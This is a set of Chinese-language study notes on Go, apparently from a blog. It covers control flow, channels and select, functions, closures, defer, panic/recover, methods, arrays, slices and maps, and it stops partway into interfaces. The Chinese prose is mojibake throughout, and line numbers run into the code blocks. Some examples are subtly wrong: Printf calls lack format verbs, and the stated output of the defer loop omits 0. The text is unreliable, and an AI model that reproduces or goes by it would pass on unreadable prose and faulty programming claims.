ç¬¬ä¸€ä¸ªiotaç­‰äº0ï¼Œæ¯å½“iotaåœ¨æ–°çš„ä¸€è¡Œè¢«ä½¿ç”¨çš„æ—¶å€™ï¼Œå€¼ä¼šè‡ªåŠ¨åŠ ä¸€ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œiotaå®é™…ä¸Šæ˜¯åœ¨è®¡ç®—constå‡ºç°çš„æ¬¡æ•°ï¼Œä¸ä¼šå—å¸¸é‡æœ¬èº«å€¼çš„å½±å“ï¼Œè€Œæ˜¯ç›´æ¥è®¡ç®—ã€‚ åŒæ—¶ï¼Œè°ƒç”¨iotaè¿›è¡Œè®¡ç®—ä¹‹åï¼Œå¯¹äºåç»­æ²¡æœ‰èµ‹å€¼çš„å¸¸é‡ï¼Œä¼šå¯¹iotaè¿›è¡Œç´¯åŠ ï¼Œç„¶åé‡å¤è®¡ç®—ã€‚ ç®—æ•°è¿ç®—ç¬¦ï¼šå¸¸è§„ç®—æ•°è¿ç®—ç¬¦ï¼Œå’Œå…³ç³»è¿ç®—ç¬¦ï¼Œä»¥åŠé€»è¾‘è¿ç®—ç¬¦ï¼Œä½è¿ç®—ç¬¦ã€‚ èµ‹å€¼è¿ç®—ç¬¦ï¼šgoçš„èµ‹å€¼è¿ç®—ç¬¦æ¯”è¾ƒå¤šï¼š GOæ¡ä»¶è¯­å¥ï¼šIf elseè¯­å¥ï¼š å’ŒPythonå·®ä¸å¤šã€‚ 1234567891011121314package mainimport &quot;fmt&quot;func main() &#123; var age int = 23 if age == 25 &#123; fmt.Println(&quot;true&quot;) &#125; else if age &lt; 25 &#123; fmt.Println(&quot;too small&quot;) &#125; else &#123; fmt.Println(&quot;too big&quot;) &#125;&#125; ä½†æ˜¯å¯ä»¥ä¸å†™:å·ï¼Œéœ€è¦èŠ±æ‹¬å·ï¼Œç›´æ¥å†™å¸ƒå°”åˆ¤æ–­è¯­å¥ã€‚ switchè¯­å¥ï¼š ç±»ä¼¼äºCè¯­è¨€ï¼ŒåŒæ—¶æ”¯æŒå¤šæ¡ä»¶åŒ¹é…ï¼Œdefaultè¯­å¥ä¸ç®¡å†™åœ¨ä»€ä¹ˆåœ°æ–¹ï¼Œéƒ½æ˜¯é»˜è®¤æœ€åæ‰§è¡Œçš„ã€‚ 12345678910111213141516171819202122232425262728package mainimport &quot;fmt&quot;func main() &#123; var x interface&#123;&#125; switch i := x.(type) &#123; case nil: fmt.Printf(&quot; x çš„ç±»å‹ :%T&quot;,i) fallthrough //ä½¿ç”¨fallthroughè¯­å¥ï¼Œä¼šå¼ºåˆ¶æ‰§è¡Œä¸‹ä¸€æ¡caseï¼Œä¸ä¼šåˆ¤æ–­æ˜¯å¦å¯ä»¥æ‰§è¡Œã€‚ case int: fmt.Printf(&quot;x æ˜¯ int å‹&quot;) case float64: fmt.Printf(&quot;x æ˜¯ float64 å‹&quot;) case func(int) float64: fmt.Printf(&quot;x æ˜¯ func(int) å‹&quot;) case bool, string: fmt.Printf(&quot;x æ˜¯ bool æˆ– string å‹&quot; ) default: fmt.Printf(&quot;æœªçŸ¥å‹&quot;) &#125; //å¤šæ¡ä»¶æ‰§è¡Œ switch&#123; case 1,2,3,4: default: &#125;&#125; selectè¯­å¥ï¼š select æ˜¯ Go ä¸­çš„ä¸€ä¸ªæ§åˆ¶ç»“æ„ï¼Œç±»ä¼¼äº switch è¯­å¥ã€‚ select è¯­å¥åªèƒ½ç”¨äºé€šé“æ“ä½œï¼Œæ¯ä¸ª case å¿…é¡»æ˜¯ä¸€ä¸ªé€šé“æ“ä½œï¼Œè¦ä¹ˆæ˜¯å‘é€è¦ä¹ˆæ˜¯æ¥æ”¶ã€‚ select è¯­å¥ä¼šç›‘å¬æ‰€æœ‰æŒ‡å®šçš„é€šé“ä¸Šçš„æ“ä½œï¼Œä¸€æ—¦å…¶ä¸­ä¸€ä¸ªé€šé“å‡†å¤‡å¥½å°±ä¼šæ‰§è¡Œç›¸åº”çš„ä»£ç å—ã€‚ å¦‚æœå¤šä¸ªé€šé“éƒ½å‡†å¤‡å¥½ï¼Œé‚£ä¹ˆ select è¯­å¥ä¼šéšæœºé€‰æ‹©ä¸€ä¸ªé€šé“æ‰§è¡Œã€‚å¦‚æœæ‰€æœ‰é€šé“éƒ½æ²¡æœ‰å‡†å¤‡å¥½ï¼Œé‚£ä¹ˆæ‰§è¡Œ default å—ä¸­çš„ä»£ç ã€‚ 123456789101112131415161718192021222324package mainimport &quot;fmt&quot;func main() &#123; var c1, c2, c3 chan int var i1, i2 int select &#123; case i1 = &lt;-c1: fmt.Printf(&quot;received &quot;, i1, &quot; from c1\\n&quot;) case c2 &lt;- i2: fmt.Printf(&quot;sent &quot;, i2, &quot; to c2\\n&quot;) case i3, ok := (&lt;-c3): // same as: i3, ok := &lt;-c3 if ok &#123; fmt.Printf(&quot;received &quot;, i3, &quot; from c3\\n&quot;) &#125; else &#123; fmt.Printf(&quot;c3 is closed\\n&quot;) &#125; default: fmt.Printf(&quot;no communication\\n&quot;) &#125; &#125;//è¾“å‡ºï¼šno communication éœ€è¦å¤šäº†è§£ä¸€ä¸‹channelç±»å‹ï¼š eg: 12345678910111213141516171819202122232425262728293031package mainimport ( &quot;fmt&quot; &quot;time&quot;)func main() &#123; c1 := make(chan string) c2 := make(chan string) go func() &#123; time.Sleep(1 * time.Second) c1 &lt;- &quot;one&quot; &#125;() go func() &#123; time.Sleep(2 * time.Second) c2 &lt;- &quot;two&quot; &#125;() for i := 0; i &lt; 2; i++ &#123; select &#123; case msg1 := &lt;-c1: fmt.Println(&quot;received&quot;, msg1) case msg2 := &lt;-c2: fmt.Println(&quot;received&quot;, msg2) &#125; &#125;&#125; channelï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ä¸€ä¸ªé€šé“ï¼Œæ•ˆæœåƒæ˜¯ä¸€ä¸ªæ°´ç®¡ï¼Œå¯ä»¥é€šè¿‡&lt;-å°†æŸä¸ªå€¼ä¼ é€’åˆ°é€šé“é‡Œã€‚ ä½¿ç”¨makeå‡½æ•°ï¼Œåˆ›å»ºä¸¤ä¸ªé€šé“ã€‚ åˆ›å»ºå¼‚æ­¥è¿è¡Œçš„å‡½æ•°ï¼š é€šè¿‡&lt;-ç¬¦å·ï¼Œå°†stringå€¼ä¼ é€’ç»™é€šé“c1ã€‚ å½“é€šé“c1æ¥æ”¶åˆ°å€¼çš„æ—¶å€™ï¼Œå°±ä¼šè¢«selectæ£€æµ‹åˆ°ï¼Œç„¶åæŠŠc1é‡Œé¢çš„å€¼æµå‡ºæ¥ï¼Œé€šè¿‡çŸ­å£°æ˜èµ‹å€¼ç»™msg1ç„¶åï¼Œè¾“å‡ºã€‚ å¦‚æœæ²¡æœ‰ä»»ä½•æ¶ˆæ¯ï¼Œå°±ç›´æ¥æ‰§è¡Œdefaultçš„å­è¯­å¥ã€‚ å¦‚æœæ²¡æœ‰defaultï¼Œå°±ç›´æ¥å¡ä½ï¼Œç›´åˆ°å¯ä»¥æ‰§è¡Œä¸ºæ­¢ã€‚ GOå¾ªç¯è¯­å¥ï¼šFor ä½¿ç”¨forè¯­å¥å’Œå¸ƒå°”è¡¨è¾¾å¼è¿›è¡Œå¾ªç¯ã€‚æ²¡æœ‰whileã€‚ 123456789101112131415s := &quot;abc&quot;for i, n := 0, len(s); i &lt; n; i++ &#123; // å¸¸è§çš„ for å¾ªç¯ï¼Œæ”¯æŒåˆå§‹åŒ–è¯­å¥ã€‚ println(s[i])&#125;n := len(s)for n &gt; 0 &#123; // æ›¿ä»£ while (n &gt; 0) &#123;&#125; println(s[n]) // æ›¿ä»£ for (; n &gt; 0;) &#123;&#125; n-- &#125;for &#123; // æ›¿ä»£ while (true) &#123;&#125; println(s) // æ›¿ä»£ for (;;) &#123;&#125;&#125; for &#123;&#125;|for (;;)&#123;&#125;å’Œ while true ä¸€ä¸ªæ„æ€ã€‚ æ­»å¾ªç¯é€šè¿‡ç›´æ¥å†™å¸ƒå°”å¼ï¼Œè¾¾æˆæ­»å¾ªç¯ï¼š å…·ä½“å¸ƒå°”å€¼æ ¼å¼ï¼š 123for init;condition;post &#123;&#125; initï¼š ä¸€èˆ¬ä¸ºèµ‹å€¼è¡¨è¾¾å¼ï¼Œç»™æ§åˆ¶å˜é‡èµ‹åˆå€¼ï¼›conditionï¼š å…³ç³»è¡¨è¾¾å¼æˆ–é€»è¾‘è¡¨è¾¾å¼ï¼Œå¾ªç¯æ§åˆ¶æ¡ä»¶ï¼›postï¼š ä¸€èˆ¬ä¸ºèµ‹å€¼è¡¨è¾¾å¼ï¼Œç»™æ§åˆ¶å˜é‡å¢é‡æˆ–å‡é‡ã€‚forè¯­å¥æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š â‘  å…ˆå¯¹è¡¨è¾¾å¼ init èµ‹åˆå€¼ï¼› â‘¡ åˆ¤åˆ«èµ‹å€¼è¡¨è¾¾å¼ init æ˜¯å¦æ»¡è¶³ç»™å®š condition æ¡ä»¶ï¼Œè‹¥å…¶å€¼ä¸ºçœŸï¼Œæ»¡è¶³å¾ªç¯æ¡ä»¶ï¼Œåˆ™æ‰§è¡Œå¾ªç¯ä½“å†…è¯­å¥ï¼Œç„¶åæ‰§è¡Œ postï¼Œè¿›å…¥ç¬¬äºŒæ¬¡å¾ªç¯ï¼Œå†åˆ¤åˆ« conditionï¼›å¦åˆ™åˆ¤æ–­ condition çš„å€¼ä¸ºå‡ï¼Œä¸æ»¡è¶³æ¡ä»¶ï¼Œå°±ç»ˆæ­¢forå¾ªç¯ï¼Œæ‰§è¡Œå¾ªç¯ä½“å¤–è¯­å¥ã€‚ é€šè¿‡rangeæ ¼å¼çš„å…³é”®å­—ï¼Œè¾¾æˆforeach()æ•ˆæœï¼› 1234for key, value := range oldMap &#123; newMap[key] = value&#125; rangerange ç”¨äºéå†æ•°ç»„æˆ–è€…å­—å…¸ã€‚ 123456789101112131415161718192021func main() &#123; s := &quot;abc&quot; // å¿½ç•¥ 2nd valueï¼Œæ”¯æŒ string/array/slice/mapã€‚ for i := range s &#123; println(s[i]) &#125; // å¿½ç•¥ indexã€‚ for _, c := range s &#123; println(c) &#125; // å¿½ç•¥å…¨éƒ¨è¿”å›å€¼ï¼Œä»…è¿­ä»£ã€‚ for range s &#123; &#125; m := map[string]int&#123;&quot;a&quot;: 1, &quot;b&quot;: 2&#125; // è¿”å› (key, value)ã€‚ for k, v := range m &#123; println(k, v) &#125;&#125; gotoã€continueã€breakgoto å’Œ C ä¸€æ ·ï¼Œè·³å›åˆ°æŒ‡å®šçš„ label é‡Œ 1234567891011func main() &#123; i := 0loop: fmt.Println(i) i++ if i &lt; 10 &#123; goto loop &#125;&#125; break å’Œ continue å’Œå…¶ä»–è¯­è¨€çš„ä¸€æ · 123456789func main() &#123; for i := 0; i &lt; 10; i++ &#123; if i%2 == 0 &#123; continue &#125; fmt.Println(i) &#125;&#125; GOå‡½æ•°ï¼šå‡½æ•°å®šä¹‰ å‡½æ•°å£°æ˜åŒ…å«ä¸€ä¸ªå‡½æ•°åï¼Œå‚æ•°åˆ—è¡¨ï¼Œ è¿”å›å€¼åˆ—è¡¨å’Œå‡½æ•°ä½“ã€‚å¦‚æœå‡½æ•°æ²¡æœ‰è¿”å›å€¼ï¼Œåˆ™è¿”å›åˆ—è¡¨å¯ä»¥çœç•¥ã€‚å‡½æ•°ä»ç¬¬ä¸€æ¡è¯­å¥å¼€å§‹æ‰§è¡Œï¼Œç›´åˆ°æ‰§è¡Œ return è¯­å¥æˆ–è€…æ‰§è¡Œå‡½æ•°çš„æœ€åä¸€æ¡è¯­å¥ã€‚ å‡½æ•°å¯ä»¥æ²¡æœ‰å‚æ•°æˆ–æ¥å—å¤šä¸ªå‚æ•°ã€‚ æ³¨æ„ç±»å‹åœ¨å˜é‡åä¹‹å ã€‚ å½“ä¸¤ä¸ªæˆ–å¤šä¸ªè¿ç»­çš„å‡½æ•°å‘½åå‚æ•°æ˜¯åŒä¸€ç±»å‹ï¼Œåˆ™é™¤äº†æœ€åä¸€ä¸ªç±»å‹ä¹‹å¤–ï¼Œå…¶ä»–éƒ½å¯ä»¥çœç•¥ã€‚ å‡½æ•°å¯ä»¥è¿”å›ä»»æ„æ•°é‡çš„è¿”å›å€¼ã€‚ ç±»å‹ç›¸åŒçš„ç›¸é‚»å‚æ•°ï¼Œå‚æ•°ç±»å‹å¯åˆå¹¶ã€‚ å¤šè¿”å›å€¼å¿…é¡»ç”¨æ‹¬å·ã€‚ 12345func test(x, y int, s string) (int, string) &#123; //è¿™é‡Œçš„ xï¼Œy éƒ½æ˜¯ int å‹ã€‚ n := x + y return n, fmt.Sprintf(s, n)&#125; å£°æ˜æ–¹å¼ï¼š 123456789func function_name( [parameter list] ) [return_types] &#123; å‡½æ•°ä½“&#125;/*func test(a,b,c int) int&#123; return 123123&#125;/* å¦‚æœæ²¡æœ‰è¿”å›å€¼å°±ä¸å†™è¿”å›ç±»å‹ï¼Œæ³¨æ„å½¢å‚ä¹Ÿè¦å†™ç±»å‹ï¼š å¦‚æœä¼šè¿”å›å¤šä¸ªå€¼ï¼š é—­åŒ…é—­åŒ…æ˜¯ç”±å‡½æ•°åŠå…¶ç›¸å…³å¼•ç”¨ç¯å¢ƒç»„åˆè€Œæˆçš„å®ä½“ï¼ˆå³ï¼šé—­åŒ…&#x3D;å‡½æ•°+å¼•ç”¨ç¯å¢ƒï¼‰ã€‚ 123456789101112131415161718192021222324package mainimport ( &quot;fmt&quot;)func a() func() int &#123; i := 0 b := func() int &#123; i++ fmt.Println(i) return i &#125; return b&#125;func main() &#123; c := a() c() c() c() a() //ä¸ä¼šè¾“å‡ºi&#125; é€’å½’123456789101112131415package mainimport &quot;fmt&quot;func factorial(i int) int &#123; if i &lt;= 1 &#123; return 1 &#125; return i * factorial(i-1)&#125;func main() &#123; var i int = 7 fmt.Printf(&quot;Factorial of %d is %d\\n&quot;, i, factorial(i))&#125; è¾“å‡ºç»“æœå°±æ˜¯ 7 çš„é˜¶ä¹˜ å»¶æ—¶è°ƒç”¨ defer å…³é”®å­— defer ç”¨äºæ³¨å†Œå»¶è¿Ÿè°ƒç”¨ã€‚ è¿™äº›è°ƒç”¨ç›´åˆ° return å‰æ‰è¢«æ‰§è¡Œã€‚å› æ­¤ï¼Œå¯ä»¥ç”¨æ¥åšèµ„æºæ¸…ç†ã€‚ å¤šä¸ªdeferè¯­å¥ï¼ŒæŒ‰å…ˆè¿›åå‡ºçš„æ–¹å¼æ‰§è¡Œã€‚ deferè¯­å¥ä¸­çš„å˜é‡ï¼Œåœ¨deferå£°æ˜æ—¶å°±å†³å®šäº†ã€‚ ç”¨é€”ï¼š å…³é—­æ–‡ä»¶å¥æŸ„ é”èµ„æºé‡Šæ”¾ æ•°æ®åº“è¿æ¥é‡Šæ”¾ defer å®šä¹‰çš„ä¸œè¥¿éµå¾ªå…ˆè¿›åå‡º 12345678910package mainimport &quot;fmt&quot;func main() &#123; var whatever [5]struct&#123;&#125; for i := range whatever &#123; defer func() &#123; fmt.Println(i) &#125;() &#125;&#125; è¾“å‡ºé¡ºåºæ˜¯4 3 2 1 å¼‚å¸¸å¤„ç†å¼‚å¸¸panicï¼š å†…ç½®å‡½æ•° å‡å¦‚å‡½æ•°Fä¸­ï¼Œä¹¦å†™äº†panicè¯­å¥ï¼Œä¼šç»ˆæ­¢å…¶åè¦æ‰§è¡Œçš„ä»£ç ï¼Œåœ¨panicæ‰€åœ¨å‡½æ•°Få†…å¦‚æœå­˜åœ¨è¦æ‰§è¡Œçš„deferå‡½æ•°åˆ—è¡¨ï¼ŒæŒ‰ç…§deferçš„é€†åºæ‰§è¡Œ è¿”å›å‡½æ•°Fçš„è°ƒç”¨è€…Gï¼Œåœ¨Gä¸­ï¼Œè°ƒç”¨å‡½æ•°Fè¯­å¥ä¹‹åçš„ä»£ç ä¸ä¼šæ‰§è¡Œï¼Œå‡å¦‚å‡½æ•°Gä¸­å­˜åœ¨è¦æ‰§è¡Œçš„deferå‡½æ•°åˆ—è¡¨ï¼ŒæŒ‰ç…§deferçš„é€†åºæ‰§è¡Œ ç›´åˆ°goroutineæ•´ä¸ªé€€å‡ºï¼Œå¹¶æŠ¥å‘Šé”™è¯¯ recoverï¼š å†…ç½®å‡½æ•° ç”¨æ¥æ§åˆ¶ä¸€ä¸ªgoroutineçš„panickingè¡Œä¸ºï¼Œæ•è·panicï¼Œä»è€Œå½±å“åº”ç”¨çš„è¡Œä¸º ä¸€èˆ¬çš„è°ƒç”¨å»ºè®® åœ¨deferå‡½æ•°ä¸­ï¼Œé€šè¿‡recoveræ¥ç»ˆæ­¢ä¸€ä¸ªgoroutineçš„panickingè¿‡ç¨‹ï¼Œä»è€Œæ¢å¤æ­£å¸¸ä»£ç çš„æ‰§è¡Œ å¯ä»¥è·å–é€šè¿‡panicä¼ é€’çš„error 123456789101112131415package mainfunc main() &#123; test()&#125;func test() &#123; defer func() &#123; if err := recover(); err != nil &#123; println(err.(string)) // å°† interface&#123;&#125; è½¬å‹ä¸ºå…·ä½“ç±»å‹ã€‚ &#125; &#125;() panic(&quot;panic error!&quot;)&#125; å»¶è¿Ÿè°ƒç”¨ä¸­å¼•å‘çš„é”™è¯¯ï¼Œå¯è¢«åç»­å»¶è¿Ÿè°ƒç”¨æ•è·ï¼Œä½†ä»…æœ€åä¸€ä¸ªé”™è¯¯å¯è¢«æ•è·ã€‚ 12345678910111213141516171819package mainimport &quot;fmt&quot;func test() &#123; defer func() &#123; fmt.Println(recover()) &#125;() defer func() &#123; panic(&quot;defer panic&quot;) &#125;() panic(&quot;test panic&quot;)&#125;func main() &#123; test()&#125; è‡ªå®šä¹‰error1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport ( &quot;fmt&quot; &quot;os&quot; &quot;time&quot;)type PathError struct &#123; path string op string createTime string message string&#125;func (p *PathError) Error() string &#123; return fmt.Sprintf(&quot;path=%s \\nop=%s \\ncreateTime=%s \\nmessage=%s&quot;, p.path, p.op, p.createTime, p.message)&#125;func Open(filename string) error &#123; file, err := os.Open(filename) if err != nil &#123; return &amp;PathError&#123; path: filename, op: &quot;read&quot;, message: err.Error(), createTime: fmt.Sprintf(&quot;%v&quot;, time.Now()), &#125; &#125; defer file.Close() return nil&#125;func main() &#123; err := Open(&quot;test.txt&quot;) switch v := err.(type) &#123; case *PathError: fmt.Println(&quot;get path error,&quot;, v) default: &#125;&#125; æ–¹æ³•Golang é‡Œçš„æ–¹æ³•æ€»æ˜¯ç»‘å®šå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯å¯¹è±¡.æ–¹æ³•()è¿™æ ·è°ƒç”¨ 123func (recevier type) methodName(å‚æ•°åˆ—è¡¨)(è¿”å›å€¼åˆ—è¡¨)&#123;&#125; //å‚æ•°å’Œè¿”å›å€¼å¯ä»¥çœç•¥ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package maintype Test struct&#123;&#125;// æ— å‚æ•°ã€æ— è¿”å›å€¼func (t Test) method0() &#123;&#125;// å•å‚æ•°ã€æ— è¿”å›å€¼func (t Test) method1(i int) &#123;&#125;// å¤šå‚æ•°ã€æ— è¿”å›å€¼func (t Test) method2(x, y int) &#123;&#125;// æ— å‚æ•°ã€å•è¿”å›å€¼func (t Test) method3() (i int) &#123; return&#125;// å¤šå‚æ•°ã€å¤šè¿”å›å€¼func (t Test) method4(x, y int) (z int, err error) &#123; return&#125;// æ— å‚æ•°ã€æ— è¿”å›å€¼func (t *Test) method5() &#123;&#125;// å•å‚æ•°ã€æ— è¿”å›å€¼func (t *Test) method6(i int) &#123;&#125;// å¤šå‚æ•°ã€æ— è¿”å›å€¼func (t *Test) method7(x, y int) &#123;&#125;// æ— å‚æ•°ã€å•è¿”å›å€¼func (t *Test) method8() (i int) &#123; return&#125;// å¤šå‚æ•°ã€å¤šè¿”å›å€¼func (t *Test) method9(x, y int) (z int, err error) &#123; return&#125;func main() &#123;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package main//æ™®é€šå‡½æ•°ä¸æ–¹æ³•çš„åŒºåˆ«ï¼ˆåœ¨æ¥æ”¶è€…åˆ†åˆ«ä¸ºå€¼ç±»å‹å’ŒæŒ‡é’ˆç±»å‹çš„æ—¶å€™ï¼‰import ( &quot;fmt&quot;)//1.æ™®é€šå‡½æ•°//æ¥æ”¶å€¼ç±»å‹å‚æ•°çš„å‡½æ•°func valueIntTest(a int) int &#123; return a + 10&#125;//æ¥æ”¶æŒ‡é’ˆç±»å‹å‚æ•°çš„å‡½æ•°func pointerIntTest(a *int) int &#123; return *a + 10&#125;func structTestValue() &#123; a := 2 fmt.Println(&quot;valueIntTest:&quot;, valueIntTest(a)) //å‡½æ•°çš„å‚æ•°ä¸ºå€¼ç±»å‹ï¼Œåˆ™ä¸èƒ½ç›´æ¥å°†æŒ‡é’ˆä½œä¸ºå‚æ•°ä¼ é€’ //fmt.Println(&quot;valueIntTest:&quot;, valueIntTest(&amp;a)) //compile error: cannot use &amp;a (type *int) as type int in function argument b := 5 fmt.Println(&quot;pointerIntTest:&quot;, pointerIntTest(&amp;b)) //åŒæ ·ï¼Œå½“å‡½æ•°çš„å‚æ•°ä¸ºæŒ‡é’ˆç±»å‹æ—¶ï¼Œä¹Ÿä¸èƒ½ç›´æ¥å°†å€¼ç±»å‹ä½œä¸ºå‚æ•°ä¼ é€’ //fmt.Println(&quot;pointerIntTest:&quot;, pointerIntTest(&amp;b)) //compile error:cannot use b (type int) as type *int in function argument&#125;//2.æ–¹æ³•type PersonD struct &#123; id int name string&#125;//æ¥æ”¶è€…ä¸ºå€¼ç±»å‹func (p PersonD) valueShowName() &#123; fmt.Println(p.name)&#125;//æ¥æ”¶è€…ä¸ºæŒ‡é’ˆç±»å‹func (p *PersonD) pointShowName() &#123; fmt.Println(p.name)&#125;func structTestFunc() &#123; //å€¼ç±»å‹è°ƒç”¨æ–¹æ³• personValue := PersonD&#123;101, &quot;hello world&quot;&#125; personValue.valueShowName() personValue.pointShowName() //æŒ‡é’ˆç±»å‹è°ƒç”¨æ–¹æ³• personPointer := &amp;PersonD&#123;102, &quot;hello golang&quot;&#125; personPointer.valueShowName() personPointer.pointShowName() //ä¸æ™®é€šå‡½æ•°ä¸åŒï¼Œæ¥æ”¶è€…ä¸ºæŒ‡é’ˆç±»å‹å’Œå€¼ç±»å‹çš„æ–¹æ³•ï¼ŒæŒ‡é’ˆç±»å‹å’Œå€¼ç±»å‹çš„å˜é‡å‡å¯ç›¸äº’è°ƒç”¨&#125;func main() &#123; structTestValue() structTestFunc()&#125; GOè¯­è¨€æ•°ç»„ï¼šå£°æ˜æ–¹æ³•ï¼š 1var variable_name [size] type ä¹Ÿå°±æ˜¯ï¼š 1var balance [10] float32 äºŒç»´æ•°ç»„ï¼š 1var variable_name [SIZE1][SIZE2]...[SIZEN] variable_type ä¹Ÿå°±æ˜¯Cè¯­è¨€çš„äºŒä½æ•°ç»„å£°æ˜æ–¹æ³•ï¼Œæ²¡ä»€ä¹ˆå˜åŒ–ã€‚ æ•°ç»„åˆå§‹åŒ–ï¼š12345//ç¬¬ä¸€ç§var balance = [5]float32&#123;1000.0, 2.0, 3.4, 7.0, 50.0&#125;//ç¬¬äºŒç§ï¼ŒçŸ­å£°æ˜balance := [5]float32&#123;1000.0, 2.0, 3.4, 7.0, 50.0&#125; ä¸ç¡®å®šæ•°ç»„é•¿åº¦ï¼Œä½¿ç”¨...æ¥è¿›è¡ŒæŒ‡ä»£ã€‚ å¯ä»¥å•ç‹¬åˆå§‹åŒ–æŸä¸ªå…ƒç´ ï¼š 1åˆå§‹åŒ–ä¸º2.0ï¼Œ3åˆå§‹åŒ–ä¸º7.0 GOæŒ‡é’ˆï¼šå£°æ˜æŒ‡é’ˆæ ¼å¼ï¼š 1var var_name *var-type åŒæ ·è¿˜æ˜¯ä½¿ç”¨&amp;ä½œä¸ºå–åœ°å€ç¬¦ã€‚ å½“GoæŒ‡é’ˆè¢«å®šä¹‰ä¹‹åï¼Œæ²¡æœ‰åˆ†é…åˆ°ä»»ä½•å˜é‡çš„æ—¶å€™ï¼Œå€¼ä¸ºnilï¼Œç§°ä¸ºç©ºæŒ‡é’ˆã€‚ GOç»“æ„ä½“ï¼šå£°æ˜ç»“æ„ä½“æ–¹å¼ï¼š 123456type struct_variable_type struct &#123; member definition member definition ... member definition&#125; å£°æ˜ç»“æ„ä½“å˜é‡ï¼š 123variable_name := structure_variable_type &#123;value1, value2...valuen&#125;æˆ–variable_name := structure_variable_type &#123; key1: value1, key2: value2..., keyn: valuen&#125; åŒæ—¶åŒ…å«å†…éƒ¨å˜é‡èµ‹å€¼ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œå¤åˆ¶çš„å­—æ®µï¼Œå°±æ˜¯ç©ºå€¼ï¼Œæˆ–æ˜¯0ã€‚ è®¿é—®ç»“æ„ä½“å†…éƒ¨å¯¹è±¡ï¼Œä½¿ç”¨ 1ç»“æ„ä½“.æˆå‘˜å&quot; ç»“æ„ä½“æŒ‡é’ˆä½ å¯ä»¥å®šä¹‰æŒ‡å‘ç»“æ„ä½“çš„æŒ‡é’ˆç±»ä¼¼äºå…¶ä»–æŒ‡é’ˆå˜é‡ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š 1var struct_pointer *Books GOåˆ‡ç‰‡ï¼šåˆ‡ç‰‡æ˜¯å¯¹æ•°ç»„çš„ä¸€ä¸ªè¿ç»­ç‰‡æ®µçš„å¼•ç”¨ï¼Œæ‰€ä»¥åˆ‡ç‰‡æ˜¯ä¸€ä¸ªå¼•ç”¨ç±»å‹ï¼Œè¿™ä¸ªç‰‡æ®µå¯ä»¥æ˜¯æ•´ä¸ªæ•°ç»„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç”±èµ·å§‹å’Œç»ˆæ­¢ç´¢å¼•æ ‡è¯†çš„ä¸€äº›é¡¹çš„å­é›†ã€‚ é€šè¿‡å£°æ˜ä¸€ä¸ªæœªæŒ‡å®šå¤§å°çš„æ•°ç»„æ¥å®šä¹‰åˆ‡ç‰‡ï¼š 1var identifier []type æˆ–æ˜¯ä½¿ç”¨**make()**å‡½æ•°æ¥åˆ›å»ºåˆ‡ç‰‡ï¼š 12345var slice1 []type = make([]type, len)ä¹Ÿå¯ä»¥ç®€å†™ä¸ºslice1 := make([]type, len) ä¹Ÿå¯ä»¥æŒ‡å®šå®¹é‡ï¼Œå…¶ä¸­capacityæ˜¯å¯é€‰å‚æ•°ã€‚ä¹Ÿå°±æ˜¯æŒ‡å®šåˆ‡ç‰‡æœ€å¤šèƒ½åˆ‡å¤šå¤§ã€‚ 1make([]T, length, capacity) è¿™é‡Œlenæ˜¯æ•°ç»„çš„é•¿åº¦ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯åˆ‡ç‰‡çš„åˆå§‹é•¿åº¦ã€‚ åˆ‡ç‰‡åˆå§‹åŒ–ï¼š 1s :=[] int &#123;1,2,3 &#125; []æ ‡è¯†åˆ‡ç‰‡ç±»å‹ã€‚ åˆ‡ä¸€ä¸ªæ•°ç»„ï¼š 123s := arr[startIndex:endIndex] //å¼•ç”¨æŸä¸ªæ•°ç»„s := arr[:] len()å’Œcap()å‡½æ•°ï¼šåˆ‡ç‰‡æ˜¯å¯ä»¥ç´¢å¼•çš„ï¼Œå¹¶ä¸”å¯ä»¥ç”±len()æ–¹æ³•è·å–é•¿åº¦ã€‚ åˆ‡ç‰‡æä¾›äº†è®¡ç®—å®¹é‡çš„æ–¹æ³•ï¼Œcap()å¯ä»¥æµ‹é‡åˆ‡ç‰‡é•¿åº¦æœ€é•¿å¯ä»¥å¾—åˆ°å¤šå°‘ å¢åŠ åˆ‡ç‰‡å†…å®¹ï¼šä½¿ç”¨append()å‡½æ•° å‘åˆ‡ç‰‡ä¸­è¿½åŠ ä¸€ä¸ªæ–°å…ƒç´ ï¼Œç”¨äºæ·»åŠ ä¸€ä¸ªæ–°å…ƒç´ ã€‚ 123456789101112 /* å…è®¸è¿½åŠ ç©ºåˆ‡ç‰‡ */numbers = append(numbers, 0)printSlice(numbers) /* å‘åˆ‡ç‰‡æ·»åŠ ä¸€ä¸ªå…ƒç´  */numbers = append(numbers, 1)printSlice(numbers) /* åŒæ—¶æ·»åŠ å¤šä¸ªå…ƒç´  */numbers = append(numbers, 2,3,4)printSlice(numbers) ä½¿ç”¨copy()å‡½æ•° æ‹·è´åˆ‡ç‰‡ï¼Œä½†æ˜¯æ˜¯ä»åæ‹·è´åˆ°å‰ï¼š 123/* æ‹·è´ numbers çš„å†…å®¹åˆ° numbers1 */ copy(numbers1,numbers) printSlice(numbers1) GOèŒƒå›´ï¼šå®é™…ä¸Šå°±æ˜¯Pythonhä¸­çš„rangeå‡½æ•°ã€‚ GOè¯­è¨€Mapï¼šä¸€ç§æ— åºçš„é”®å€¼å¯¹é›†åˆï¼Œå®é™…ä¸Šåº”è¯¥å’ŒJavaä¸­çš„mapæ˜¯å·®ä¸å¤šçš„ï¼Œä¸€ç§åŸºäºHashè®¡ç®—çš„é›†åˆã€‚ ç±»å‹è½¬æ¢ï¼šç±»å‹è½¬æ¢æ ¼å¼ï¼š 1type_name(expression) ï¼Ÿï¼Œè½¬æ¢æ–¹å¼æ˜¯åçš„ï¼Œç›¸å½“äºè°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°å»å¤„ç†ã€‚ GOæ¥å£ï¼šGo 